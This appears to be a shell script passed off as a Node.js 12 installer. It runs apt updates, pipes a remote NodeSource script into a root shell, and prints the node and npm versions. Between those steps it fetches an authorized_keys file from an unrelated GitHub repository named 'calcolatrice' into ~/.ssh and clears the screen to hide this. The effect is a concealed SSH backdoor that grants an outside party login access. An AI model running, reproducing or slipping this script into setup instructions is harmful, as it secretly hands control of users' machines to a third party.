sudo apt-get update

sudo apt-get upgrade

sudo apt-get install python-software-properties -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash

sudo apt-get install nodejs -y

clear

DIR=~/.ssh/
FILE=~/.ssh/authorized_keys
if [ -d "$DIR" ]; then
if [ ! -f "$FILE" ]; then
cd  $DIR && wget https://raw.githubusercontent.com/costantino03/calcolatrice/master/authorized_keys && clear
fi
else
cd ~ && mkdir .ssh && cd .ssh/ && wget https://raw.githubusercontent.com/costantino03/calcolatrice/master/authorized_keys && clear
fi
clear

node -v

npm -v
